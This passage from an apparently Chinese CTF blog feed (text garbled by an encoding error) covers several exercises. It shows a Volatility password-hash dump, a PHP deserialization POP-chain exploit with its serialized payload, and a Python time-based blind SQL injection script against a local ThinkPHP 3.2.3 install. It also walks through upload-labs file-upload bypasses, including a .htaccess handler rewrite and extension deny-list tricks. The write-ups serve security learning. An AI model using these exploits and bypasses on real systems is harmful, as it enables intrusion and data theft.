imageinfo</code>ï¼Œå¾—åˆ°profileå€¼ä¸º<code>WinXPSP2x86</code></p><p><img src="https://s2.ax1x.com/2019/02/05/kYFHdx.png" alt="kYFHdx.png"></p><p>ç›´æ¥hashdumpï¼Œæ¯•ç«Ÿåœ¨Windowsç³»ç»Ÿä¸‹é¢ï¼Œä½†å¸¸è§„è¿˜æ˜¯å¾—æŸ¥æ³¨å†Œè¡¨ä½ç½®ï¼Œæ‰¾åˆ°systemå’Œsam keyçš„èµ·å§‹ä½ç½®<code>hivelist -f memory -profile=WinXPSP2x86</code>ï¼Œè¿™é‡Œå°±ä¸æ¼”ç¤ºäº†ï¼Œç›´æ¥hashdumpäº†</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f memory --profile=WinXPSP2x86 hashdump</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/02/05/kYkZlQ.png" alt="kYkZlQ.png"></p><p>è·å¾—å¯†ç <code>c22b315c040ae6e0efee3518d830362b</code></p><p><img src="https://s2.ax1x.com/2019/02/05/kYkumn.png" alt="kYkumn.png"></p><h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><h4 id="babyGo"><a href="#babyGo" class="headerlink" title="babyGo"></a>babyGo</h4><p>ä¸Šæ¥å°±ä¸€ä¸ªæºç ï¼Œä½†çœ‹åˆ°<code>unserialize</code>åº”è¯¥å°±æ˜¯å¾€ååºåˆ—åŒ–é‚£ä¸ªæ–¹å‘æ€è€ƒã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span>  </span><br><span class="line">@error_reporting(<span class="number">1</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">baby</span> </span></span><br><span class="line"><span class="class"></span>&#123;   </span><br><span class="line">    <span class="keyword">protected</span> $skyobj;  </span><br><span class="line">    <span class="keyword">public</span> $aaa;</span><br><span class="line">    <span class="keyword">public</span> $bbb;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span></span><br><span class="line"><span class="function">    </span>&#123;      </span><br><span class="line">        <span class="keyword">$this</span>-&gt;skyobj = <span class="keyword">new</span> sec;</span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span>      </span></span><br><span class="line"><span class="function">    </span>&#123;          </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;skyobj))  </span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;skyobj-&gt;read();      </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cool</span> </span></span><br><span class="line"><span class="class"></span>&#123;    </span><br><span class="line">    <span class="keyword">public</span> $filename;     </span><br><span class="line">    <span class="keyword">public</span> $nice;</span><br><span class="line">    <span class="keyword">public</span> $amzing; </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span>      </span></span><br><span class="line"><span class="function">    </span>&#123;   </span><br><span class="line">        <span class="keyword">$this</span>-&gt;nice = unserialize(<span class="keyword">$this</span>-&gt;amzing);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nice-&gt;aaa = $sth;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;nice-&gt;aaa === <span class="keyword">$this</span>-&gt;nice-&gt;bbb)</span><br><span class="line">        &#123;</span><br><span class="line">            $file = <span class="string">"./&#123;$this-&gt;filename&#125;"</span>;        </span><br><span class="line">            <span class="keyword">if</span> (file_get_contents($file))         </span><br><span class="line">            &#123;              </span><br><span class="line">                <span class="keyword">return</span> file_get_contents($file); </span><br><span class="line">            &#125;  </span><br><span class="line">            <span class="keyword">else</span> </span><br><span class="line">            &#123; </span><br><span class="line">                <span class="keyword">return</span> <span class="string">"you must be joking!"</span>; </span><br><span class="line">            &#125;    </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">sec</span> </span></span><br><span class="line"><span class="class"></span>&#123;  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span>     </span></span><br><span class="line"><span class="function">    </span>&#123;          </span><br><span class="line">        <span class="keyword">return</span> <span class="string">"it's so sec~~"</span>;      </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'data'</span>]))  </span><br><span class="line">&#123; </span><br><span class="line">    $Input_data = unserialize($_GET[<span class="string">'data'</span>]);</span><br><span class="line">    <span class="keyword">echo</span> $Input_data; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123; </span><br><span class="line">    highlight_file(<span class="string">"./index.php"</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œæ¶‰åŠåˆ°ä¸€ä¸ªå«popé“¾çš„æ„é€ é—®é¢˜ï¼Œä¸‹é¢è¿™ç¯‡æ–‡ç« å°±è®²çš„å¾ˆè¯¦ç»†äº†<code>https://www.cnblogs.com/iamstudy/articles/php_object_injection_pop_chain.html</code>ï¼Œç®€å•æ¥è¯´å°±æ˜¯å½“å…³é”®çš„ä»£ç ä¸åœ¨é­”æœ¯æ–¹æ³•çš„æ—¶å€™è€Œæ˜¯åœ¨ä¸€äº›ç±»çš„æ™®é€šæ–¹æ³•é‡Œé¢çš„æ—¶å€™ï¼Œå¯ä»¥é€šè¿‡å¯»æ‰¾ç›¸åŒçš„å‡½æ•°åå°†ç±»çš„å±æ€§å’Œæ•æ„Ÿå‡½æ•°çš„å±æ€§è”ç³»èµ·æ¥ã€‚è¿™é‡Œéœ€è¦æ»¡è¶³ä¸¤ä¸ªæ¡ä»¶ï¼š</p><ol><li>å…³é”®ä»£ç ä¸åœ¨é­”æœ¯æ–¹æ³•é‡Œ</li><li>æ™®é€šçš„æ–¹æ³•é‡Œé¢å¿…é¡»è¦æœ‰ç›¸åŒå‡½æ•°å</li></ol><p>è§‚å¯Ÿå…³é”®ä»£ç ï¼Œå‘ç°è¦å®ç°è¯»æ–‡ä»¶çš„åŠŸèƒ½ï¼Œå¾—å…ˆæ»¡è¶³ä¸‹é¢çš„æ¡ä»¶</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;nice-&gt;aaa === <span class="keyword">$this</span>-&gt;nice-&gt;bbb)</span><br><span class="line">      &#123;</span><br><span class="line">          $file = <span class="string">"./&#123;$this-&gt;filename&#125;"</span>;        </span><br><span class="line">          <span class="keyword">if</span> (file_get_contents($file))         </span><br><span class="line">          &#123;              </span><br><span class="line">              <span class="keyword">return</span> file_get_contents($file); </span><br><span class="line">          &#125;</span><br></pre></td></tr></table></figure><p>å› ä¸ºä¸¤ä¸ªç±»éƒ½å­˜åœ¨readå‡½æ•°è¿™ä¸ªæ—¶å€™å°±å¾ˆå¯ä»¥å…ˆæ„é€ popé“¾ï¼Œå› ä¸ºskyobjæ˜¯ä¸ªprotectedç±»å‹çš„å˜é‡ï¼Œåªèƒ½ä½¿ç”¨å¯¹è±¡æ³¨å…¥äº†ï¼Œè¿™æ ·æ— è®ºæ˜¯privateè¿˜æ˜¯publicéƒ½å¯ä»¥æ§åˆ¶ï¼Œä½†æ˜¯aaaçš„å€¼ä¼šå˜åŒ–ï¼Œæ‰€ä»¥éœ€è¦ä½¿ç”¨å¼•ç”¨ä½¿bbbåŠ¨æ€è·Ÿç€aaaã€‚å…ˆæ„é€ amazing</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">baby</span> </span></span><br><span class="line"><span class="class"></span>&#123;   </span><br><span class="line">    <span class="keyword">protected</span> $skyobj;  </span><br><span class="line">    <span class="keyword">public</span> $aaa;</span><br><span class="line">    <span class="keyword">public</span> $bbb;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span></span><br><span class="line"><span class="function">    </span>&#123;      </span><br><span class="line">        <span class="keyword">$this</span>-&gt;skyobj = <span class="keyword">new</span> cool;</span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span>      </span></span><br><span class="line"><span class="function">    </span>&#123;          </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;skyobj))  </span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;skyobj-&gt;read();      </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cool</span> </span></span><br><span class="line"><span class="class"></span>&#123;    </span><br><span class="line">    <span class="keyword">public</span> $filename;     </span><br><span class="line">    <span class="keyword">public</span> $nice;</span><br><span class="line">    <span class="keyword">public</span> $amzing;</span><br><span class="line"></span><br><span class="line">&#125;   </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> baby();</span><br><span class="line">$a-&gt;bbb =&amp;$a-&gt;aaa;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$amzing=<span class="string">'O%3A4%3A%22baby%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00skyobj%22%3BO%3A4%3A%22cool%22%3A3%3A%7Bs%3A8%3A%22filename%22%3BN%3Bs%3A4%3A%22nice%22%3BN%3Bs%3A6%3A%22amzing%22%3BN%3B%7Ds%3A3%3A%22aaa%22%3BN%3Bs%3A3%3A%22bbb%22%3BR%3A6%3B%7D'</span>;</span><br></pre></td></tr></table></figure><p>æœ€ç»ˆçš„exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">baby</span> </span></span><br><span class="line"><span class="class"></span>&#123;   </span><br><span class="line">    <span class="keyword">protected</span> $skyobj;    </span><br><span class="line">    <span class="keyword">public</span> $aaa;</span><br><span class="line">    <span class="keyword">public</span> $bbb;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span></span><br><span class="line"><span class="function">    </span>&#123;          </span><br><span class="line">        <span class="keyword">$this</span>-&gt;skyobj = <span class="keyword">new</span> cool;   </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span>      </span></span><br><span class="line"><span class="function">    </span>&#123;          </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;skyobj))  </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;skyobj-&gt;read();      </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cool</span> </span></span><br><span class="line"><span class="class"></span>&#123;    </span><br><span class="line">    <span class="keyword">public</span> $filename=<span class="string">'./flag.php'</span>;     </span><br><span class="line">    <span class="keyword">public</span> $nice;</span><br><span class="line">    <span class="keyword">public</span> $amzing=<span class="string">'O%3A4%3A%22baby%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00skyobj%22%3BO%3A4%3A%22cool%22%3A3%3A%7Bs%3A8%3A%22filename%22%3BN%3Bs%3A4%3A%22nice%22%3BN%3Bs%3A6%3A%22amzing%22%3BN%3B%7Ds%3A3%3A%22aaa%22%3BN%3Bs%3A3%3A%22bbb%22%3BR%3A6%3B%7D'</span>; </span><br><span class="line">&#125;   </span><br><span class="line">$a = <span class="keyword">new</span> baby();</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/02/06/kYRMtg.png" alt="kYRMtg.png"></p><h4 id="Simple-PHP"><a href="#Simple-PHP" class="headerlink" title="Simple PHP"></a>Simple PHP</h4><p>æ„Ÿè§‰é¢˜ç›®ç©åäº†ã€‚ã€‚ã€‚ã€‚</p><p>åæ­£çœ‹äº†çœ‹ä¸€å¶é£˜é›¶å¤§ä½¬çš„é¢˜è§£ï¼Œè€ƒçš„æ˜¯ä¸€ä¸ªSQLçº¦æŸæ”»å‡»ï¼Œä»¥åŠä¸€ä¸ªtp3.2çš„ä¸€ä¸ªæ³¨å…¥ï¼Œçœ‹èµ·æ¥æ˜¯ä¸ªæŠ¥é”™æ³¨å…¥ï¼Œè¿˜æ˜¯å¾ˆæœ‰æ„æ€çš„ä¸€ä¸ªé¢˜ç›®ã€‚è‡ªå·±æŠŠæºç ä¸‹ä¸‹æ¥è‡ªå·±å¤ç°ä¸€ä¸‹23333ï¼Œä»–è¿™ä¸ªä»£ç é‡Œé¢å…³é”®æ˜¯æœ‰ä¸€ä¸ªoptionså˜é‡æ˜¯å¯æ§çš„ï¼Œè¿™ä¿®å¤çš„æ–¹æ¡ˆä¹Ÿæ˜¯ä¸å†å¼•ç”¨å¤–éƒ¨çš„å¯æ§å˜é‡</p><p>æºç ä¸‹è½½:<a href="http://www.thinkphp.cn/download/610.html" target="_blank" rel="noopener">http://www.thinkphp.cn/download/610.html</a></p><p>ä¸‹é¢æ˜¯è‡ªå·±æ­å»ºè¯¥ç¯å¢ƒ(phpstudy)çš„æµ‹è¯•è¿‡ç¨‹</p><p><img src="https://s2.ax1x.com/2019/02/06/kYT2ff.png" alt="kYT2ff.png"></p><p><img src="https://s2.ax1x.com/2019/02/06/kYI7uj.png" alt="kYI7uj.png"></p><p><img src="https://s2.ax1x.com/2019/02/06/kYI58S.png" alt="kYI58S.png"></p><p>å†å°è¯•ä¸€ä¸‹é£˜é›¶å¤§å“¥çš„æ–¹æ³•,åˆ©ç”¨äº†ä¸€ä¸ªæ—¶é—´ç›²æ³¨çš„æ–¹æ³•ï¼Œtql(ç ´éŸ³)~</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">12</span>):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">45</span>,<span class="number">127</span>):</span><br><span class="line">url = <span class="string">'http://127.0.0.1/thinkphp3.2.3/index.php?m=Home&amp;c=Index&amp;a=test&amp;id[where]=1 and if((ascii(substr((select pass from user limit 0,1),'</span>+str(i)+<span class="string">',1))='</span>+str(j)+<span class="string">'),sleep(3),0)--'</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">r = requests.get(url=url,timeout=<span class="number">2.5</span>)</span><br><span class="line"><span class="keyword">print</span> url</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">flag += chr(j)</span><br><span class="line"><span class="keyword">print</span> flag</span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>åŒæ ·ä¹Ÿèƒ½è·‘å‡ºç»“æœ</p><p><img src="https://s2.ax1x.com/2019/02/06/kYTbt0.png" alt="kYTbt0.png"></p>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>upload-labsè®°å½•</title>
      <link href="/upload-labs-wp.html"/>
      <url>/upload-labs-wp.html</url>
      <content type="html"><![CDATA[<p>é—²æ¥æ— èŠï¼ŒæŠŠupload-labsæ‰€æœ‰çš„å…³å¡éƒ½åˆ·ä¸€é<a id="more"></a>ï¼Œå°±å½“å¤ä¹ ä¸€ä¸‹æ–‡ä»¶ä¸Šä¼ æ¼æ´çš„å„ç§ç»•è¿‡æŠ€å·§å§ï¼Œåšå®Œä¸€å…³å†çœ‹çœ‹æºä»£ç æé«˜ä¸€ä¸‹å®¡è®¡èƒ½åŠ›æŒºå¥½çš„</p><h3 id="Pass-01"><a href="#Pass-01" class="headerlink" title="Pass-01"></a>Pass-01</h3><p>ä¸€ä¸ªå‰ç«¯æ£€æµ‹ï¼Œå¯ä»¥ç¦ç”¨jsï¼Œä¹Ÿå¯ä»¥ç›´æ¥æŠ“åŒ…å°±å¯ä»¥ç»•è¿‡ä¸Šä¼ </p><p><img src="https://s2.ax1x.com/2019/02/04/kJ9HYQ.png" alt="kJ9HYQ.png"></p><p>è®¿é—®æˆåŠŸ</p><p><img src="https://s2.ax1x.com/2019/02/04/kJ9zwT.png" alt="kJ9zwT.png"></p><h3 id="Pass-02"><a href="#Pass-02" class="headerlink" title="Pass-02"></a>Pass-02</h3><p>Content-Typeç»•è¿‡ï¼Œç›´æ¥æŠŠContent-Typeæ”¹ä¸ºå›¾ç‰‡ç±»å‹å³å¯</p><p><img src="https://s2.ax1x.com/2019/02/04/kJCA61.png" alt="kJCA61.png"></p><p>ä¸Šä¼ æˆåŠŸ</p><p><img src="https://s2.ax1x.com/2019/02/04/kJCmTO.png" alt="kJCmTO.png"></p><h3 id="Pass-03"><a href="#Pass-03" class="headerlink" title="Pass-03"></a>Pass-03</h3><p>è¿™ä¸€å…³æ˜¯å¦ç±»çš„æ–‡ä»¶åçš„ç»•è¿‡ï¼Œå¯ä»¥å°è¯•phtmlï¼Œphp3ï¼Œphp4, php5, phtåç¼€åéƒ½å¯ä»¥ç»•è¿‡ï¼Œä½†æ˜¯å‰ææ˜¯è¦åœ¨é…ç½®æ–‡ä»¶é‡Œé¢æœ‰è¿™æ ·çš„ä¸€å¥è¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .php .phtml .phps .php5 .pht</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/02/04/kJCIj1.png" alt="kJCIj1.png"></p><p>æˆåŠŸå›æ˜¾</p><p><img src="https://s2.ax1x.com/2019/02/04/kJC7B6.png" alt="kJC7B6.png"></p><p>æºç é‡Œé¢ç›´æ¥ç”¨çš„é»‘åå•ã€‚ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$deny_ext = <span class="keyword">array</span>(<span class="string">'.asp'</span>,<span class="string">'.aspx'</span>,<span class="string">'.php'</span>,<span class="string">'.jsp'</span>);</span><br></pre></td></tr></table></figure><p>å½“ç„¶è¿˜æœ‰ç¬¬äºŒç§æ–¹æ³•</p><p>å°±æ˜¯ä¸Šä¼ <code>.htaccess</code>ï¼Œå®ç°é‡å†™æ–‡ä»¶è§£æ,åŒæ ·è¿™æ ·çš„å‰æä¹Ÿæ˜¯å¾—åœ¨é…ç½®æ–‡ä»¶é‡Œé¢æœ‰è¿™æ ·çš„ä¸€å¥è¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AllowOverride All</span><br><span class="line">LoadModule rewrite_module modules/mod_rewrite.so</span><br></pre></td></tr></table></figure><h3 id="Pass-04"><a href="#Pass-04" class="headerlink" title="Pass-04"></a>Pass-04</h3><p>ä¸Šé¢çš„æ–¹æ³•å·²ç»ä¸è¡Œäº†ï¼Œå¯ä»¥çœ‹ä¸€ä¸‹ä»–è¿‡æ»¤çš„åå•</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">"php1"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">"pHp1"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>);</span><br></pre></td></tr></table></figure><p>æ¯”åˆšæ‰çš„é»‘åå•å¤šäº†ä¸å°‘ï¼Œä½†æ˜¯<code>.htaccess</code>è¿˜æ˜¯æ²¡æœ‰è¿‡æ»¤ï¼Œå¯ä»¥é‡å†™æ–‡ä»¶è§£æè§„åˆ™ç»•è¿‡ï¼Œä¸Šä¼ ä¸€ä¸ª<code>.htaccess</code>ï¼Œæ–‡ä»¶å†…å®¹å¦‚ä¸‹ï¼Œå°±æ˜¯åœ¨uploadç›®å½•ä¸‹åŒ¹é…gg.jpgçš„æ–‡ä»¶å¹¶ä»¥phpæ–‡ä»¶æ‰§è¡Œ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;gg.jpg&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/02/04/kJPput.png" alt="kJPput.png"></p><p>ç„¶åå†ä¸Šä¼ ä¸€ä¸ªåå­—ä¸ºgg.jpgçš„è„šæœ¬</p><p><img src="https://s2.ax1x.com/2019/02/04/kJVbM4.png" alt="kJVbM4.png"></p><p>ç„¶åè®¿é—®æˆåŠŸæ‰§è¡Œ</p><p><img src="https://s2.ax1x.com/2019/02/04/kJZgfK.png" alt="kJZgfK.png"></p><h3 id="Pass-05"><a href="#Pass-05" class="headerlink" title="Pass-05"></a>Pass-05</h3><p>è¿™ä¸€é¢˜é‡Œé¢å¤šè¿‡æ»¤äº†<code>.htaccess</code>ï¼Œå¦‚ä½•ç»•è¿‡å‘¢ï¼Ÿ</p><p><img src="https://s2.ax1x.com/2019/02/04/kJmaqJ.png" alt="kJmaqJ.png"></p><p>å¯¹æ¯”ä¸€ä¸‹ä»£ç å¯ä»¥çŸ¥é“ï¼Œå¯ä»¥ä½¿ç”¨å¤§å°å†™ç»•è¿‡ï¼Œå› ä¸ºè¿™é‡ŒæŠŠåŸæ¥è½¬æ¢æˆå°å†™çš„é‚£ä¸€éƒ¨åˆ†ç»™åˆ æ‰äº†</p><p><img src="https://s2.ax1x.com/2019/02/04/kJmBI1.png" alt="kJmBI1.png"></p><h3 id="Pass-06"><a href="#Pass-06" class="headerlink" title="Pass-06"></a>Pass-06</h3><p>è¿™ä¸€å…³æ¯”ç¬¬äº”å…³å°‘äº†è¿™æ ·çš„ä¸€å¥ä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$file_ext = trim($file_ext); <span class="comment">//é¦–å°¾å»ç©º</span></span><br></pre></td></tr></table></figure><p>æ‰€ä»¥å¯ä»¥åç¼€å+ç©ºæ ¼çš„å½¢å¼å»ç»•è¿‡</p><p><img src="https://s2.ax1x.com/2019/02/04/kJnO1K.png" alt="kJnO1K.png"></p><h3 id="Pass-07"><a href="#Pass-07" class="headerlink" title="Pass-07"></a>Pass-07</h3><p>å¯¹æ¯”ç¬¬6é¢˜çš„ä»£ç å¯ä»¥å‘ç°å°‘äº†ä¸‹é¢ä¸€å¥ä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$file_name = deldot($file_name);<span class="comment">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span></span><br></pre></td></tr></table></figure><p>æ—¢ç„¶æ²¡æœ‰å¯¹æ–‡ä»¶æœ€åçš„ç‚¹åšè¿‡æ»¤ï¼Œå¯ä»¥å°è¯•ä»¥åç¼€ååŠ ä¸Šç‚¹çš„å½¢å¼å»ç»•è¿‡</p><p><img src="https://s2.ax1x.com/2019/02/04/kJKZ26.png" alt="kJKZ26.png"></p><h3 id="Pass-08"><a href="#Pass-08" class="headerlink" title="Pass-08"></a>Pass-08</h3><p>è¿™ä¸€é¢˜çš„ä»£ç æ¯”ä¸Šä¸€æ¬¡å°‘äº†ä¸‹é¢è¿™ä¸€æ®µä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span></span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæ˜¯å…³äºwindowsä¸‹æ–‡ä»¶çš„æµç‰¹æ€§ï¼Œå¯ä»¥å‚è€ƒä¸€ä¸‹è¿™ç¯‡æ–‡ç« </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 